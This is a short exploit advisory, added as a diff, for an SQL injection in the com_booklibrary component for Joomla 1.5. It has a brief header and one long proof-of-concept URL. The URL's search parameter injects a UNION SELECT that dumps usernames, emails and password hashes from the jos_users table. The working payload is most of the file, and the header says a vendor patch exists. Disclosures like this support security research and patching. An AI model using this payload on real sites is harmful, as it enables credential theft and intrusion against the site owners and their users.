@@ -1,0 +1,22 @@
+# Exploit Title: SQL Injection in component com_booklibrary for Joomla
+# Date: [17.03.2011]
+# Author: [Marc Doudiet]
+# Software Link: [http://ordasoft.com/Shop/OrdaSoft/BookLibrary/BookLibrary-search-Books-module-version-2.0/flypage.tpl.html]
+# Version: [Version 2.0 for Joomla 1.5]
+# Tested on: [PHP Mysql]
+
+There is a SQL Injection in com_booklibrary for Joomla 1.5.
+Tested on a fresh install, the author confirmed that a patch is available.
+
+PoC (show the hash of the table jos_users):
+http://xxx.xxx.xxx.xxx/index.php?searchtext=%'%20OR%20LOWER(b.bookid)%20LIKE%20'%a%'%20OR%20LOWER(b.isbn)%20LIKE%20'%a%'%20OR%20LOWER(b.title)%20L
+IKE%20'%a%'%20OR%20LOWER(b.manufacturer)%20LIKE%20'%a%'%20OR%20LOWER(b.comment)%20LIKE%20'%a%')%20AND%20b.publish
+ed='1'%20AND%20b.approved='1'%20AND%20b.archived='0'%20UNION%20SELECT%201,2,username,email,password,6,7,8,9,10,11
+,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33%20FROM%20jos_users%20UNION%20SELECT%20b.*,%20b
+lr2.rating2,%20c.title%20AS%20category_titel,c.id%20AS%20catid,%20c.ordering%20AS%20category_ordering%20FROM%20jo
+s_booklibrary%20AS%20b%20LEFT%20JOIN%20jos_booklibrary_categories%20AS%20bc%20ON%20bc.bookid%20=%20b.id%20LEFT%20
+JOIN%20jos_categories%20AS%20c%20ON%20bc.catid%20=%20c.id%20LEFT%20JOIN%20(%20SELECT%20ROUND(avg(blr1.rating))%20
+AS%20rating2,%20fk_bookid%20FROM%20jos_booklibrary%20AS%20bl%20LEFT%20JOIN%20jos_booklibrary_review%20AS%20blr1%2
+0ON%20blr1.fk_bookid%20=%20bl.id%20GROUP%20BY%20blr1.fk_bookid%20)%20blr2%20ON%20blr2.fk_bookid%20=%20b.id%20WHER
+E%20(LOWER(b.authors)%20LIKE%20'%&catid=0&option=com_booklibrary&task=search&Itemid=53&author=true&title=true&isb
+n=true&description=true&publisher=true&bookid=true
